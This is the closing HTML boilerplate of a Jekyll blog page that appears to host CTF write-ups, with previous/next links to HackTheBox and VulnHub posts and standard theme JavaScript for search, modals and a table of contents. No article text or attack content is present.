<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/hackthebox/retired/2020/06/12/Monteverde.html">HackTheBox Monteverde</a></div><div class="next"><span>NEXT</span><a href="/otherposts/2020/06/24/Ganana.html">VulnHub GANANA</a></div></div></div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div><div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main"><div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jeevan"><meta itemprop="url" content="/"><meta itemprop="description" content="HACKER	||	PENETRATION TESTER	||	CTF PLAYER	||	BLOGGER || INDEPENDENT RESEARCHER."><div class="footer__author-links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"></ul>
</div>
</div>
    </div><div class="site-info mt-2">
      <div>© D3c0deZ3r0 2021,
        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> 
      </div>
    </div>
  </div>
</footer>
</div></div>
    </div><script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text" />
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div></div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script>
    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

